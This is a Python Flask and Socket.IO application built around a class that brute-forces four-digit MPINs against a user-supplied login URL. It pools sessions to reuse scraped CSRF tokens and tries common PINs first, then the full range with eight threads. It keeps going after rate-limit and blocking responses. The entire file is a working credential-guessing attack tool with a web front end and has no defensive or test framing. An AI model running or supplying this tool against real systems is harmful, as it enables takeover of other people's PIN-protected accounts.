import threading
import time
import requests
from bs4 import BeautifulSoup
import concurrent.futures
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*")

# Store running tasks (keyed by socket session id)
active_tasks = {}

class WebBruteForcer:
    def __init__(self, url, username, sid, stop_event):
        self.url = url.rstrip('/')
        self.username = username
        self.sid = sid
        self.stop_event = stop_event
        self.found = False
        self.attempts = 0
        self.start_time = time.time()
        self.session_pool = []

    def emit_progress(self, event, data):
        socketio.emit(event, data, room=self.sid)

    def create_session_pool(self, size=5):
        self.emit_progress('log', {'message': '🔄 Creating session pool...'})
        for _ in range(size):
            if self.stop_event.is_set():
                return False
            try:
                session = requests.Session()
                resp = session.get(self.url, timeout=5)
                soup = BeautifulSoup(resp.text, "html.parser")
                csrf_element = soup.find("input", {"name": "_token"})
                if csrf_element:
                    self.session_pool.append({
                        'session': session,
                        'csrf_token': csrf_element["value"],
                        'last_used': time.time()
                    })
            except Exception as e:
                continue
        self.emit_progress('log', {'message': f'✅ Created {len(self.session_pool)} sessions'})
        return len(self.session_pool) > 0

    def get_session_from_pool(self):
        if self.session_pool:
            session_data = self.session_pool.pop(0)
            session_data['last_used'] = time.time()
            return session_data
        else:
            try:
                session = requests.Session()
                resp = session.get(self.url, timeout=5)
                soup = BeautifulSoup(resp.text, "html.parser")
                csrf_element = soup.find("input", {"name": "_token"})
                if csrf_element:
                    return {
                        'session': session,
                        'csrf_token': csrf_element["value"],
                        'last_used': time.time()
                    }
            except:
                pass
        return None

    def return_session_to_pool(self, session_data):
        if session_data:
            self.session_pool.append(session_data)

    def try_mpin(self, mpin):
        if self.found or self.stop_event.is_set():
            return None

        session_data = self.get_session_from_pool()
        if not session_data:
            return None

        try:
            mpin_str = str(mpin).zfill(4)
            data = {
                "username": self.username,
                "password": mpin_str,
                "_token": session_data['csrf_token']
            }

            response = session_data['session'].post(self.url, data=data, timeout=5)
            self.attempts += 1

            if self.attempts % 10 == 0:
                elapsed = time.time() - self.start_time
                self.emit_progress('progress', {
                    'attempts': self.attempts,
                    'current': mpin_str,
                    'elapsed': round(elapsed, 1),
                    'speed': round(self.attempts / elapsed, 2) if elapsed > 0 else 0
                })

            try:
                json_response = response.json()
                if json_response.get("signal") == "success":
                    self.found = True
                    return mpin_str
                elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
                    self.emit_progress('log', {'message': f'⚠️ Possible blocking: {json_response}'})
            except:
                if response.status_code == 302:
                    self.found = True
                    return mpin_str
                elif response.status_code == 429:
                    self.emit_progress('log', {'message': '⚠️ Rate limited – slowing down...'})
                    time.sleep(2)

        except Exception as e:
            session_data = None
        finally:
            if session_data and not self.found and not self.stop_event.is_set():
                self.return_session_to_pool(session_data)

        return None

    def run(self):
        common_pins = [
            1234, 1111, 0000, 1212, 7777, 1004, 2000, 4444, 2222, 6969,
            9999, 3333, 5555, 6666, 1122, 1313, 8888, 4321, 2001, 1010,
            1230, 1235, 1236, 1237, 1238, 1239, 1112, 1113, 1114, 1115,
            1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
        ]

        if not self.create_session_pool(8):
            self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
            return

        self.emit_progress('log', {'message': '🚀 Starting brute force...'})
        self.emit_progress('log', {'message': '🔍 Testing 40 common PINs first...'})

        for i, mpin in enumerate(common_pins):
            if self.stop_event.is_set():
                self.emit_progress('log', {'message': '⛔ Stopped by user.'})
                return
            result = self.try_mpin(mpin)
            if result:
                elapsed = time.time() - self.start_time
                self.emit_progress('success', {
                    'mpin': result,
                    'attempts': self.attempts,
                    'elapsed': round(elapsed, 1)
                })
                return
            if (i + 1) % 10 == 0:
                self.emit_progress('log', {'message': f'   Tested {i+1}/40 common PINs'})

        self.emit_progress('log', {'message': '❌ Not in common PINs. Starting full range...'})

        all_mpins = [mpin for mpin in range(10000) if mpin not in common_pins]
        chunk_size = 100
        chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]

        for chunk in chunks:
            if self.stop_event.is_set() or self.found:
                break

            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
                futures = {executor.submit(self.try_mpin, mpin): mpin for mpin in chunk}
                for future in concurrent.futures.as_completed(futures):
                    if self.stop_event.is_set() or self.found:
                        break
                    result = future.result()
                    if result:
                        elapsed = time.time() - self.start_time
                        self.emit_progress('success', {
                            'mpin': result,
                            'attempts': self.attempts,
                            'elapsed': round(elapsed, 1)
                        })
                        return

        total_time = time.time() - self.start_time
        self.emit_progress('fail', {
            'attempts': self.attempts,
            'elapsed': round(total_time, 1)
        })

# ---------- Socket.IO event handlers ----------
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in active_tasks:
        active_tasks[sid].set()
        del active_tasks[sid]
    print('Client disconnected')

@socketio.on('start_bruteforce')
def handle_start(data):
    url = data.get('url')
    username = data.get('username')
    sid = request.sid

    if not url or not username:
        emit('error', {'message': 'URL and username are required'})
        return

    if sid in active_tasks:
        active_tasks[sid].set()

    stop_event = threading.Event()
    active_tasks[sid] = stop_event

    def task():
        forcer = WebBruteForcer(url, username, sid, stop_event)
        forcer.run()
        if sid in active_tasks:
            del active_tasks[sid]

    thread = threading.Thread(target=task)
    thread.daemon = True
    thread.start()

    emit('log', {'message': 'Brute force started...'})

@socketio.on('stop_bruteforce')
def handle_stop():
    sid = request.sid
    if sid in active_tasks:
        active_tasks[sid].set()
        emit('log', {'message': 'Stop signal sent.'})
    else:
        emit('log', {'message': 'No active task to stop.'})

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    socketio.run(app, debug=True)
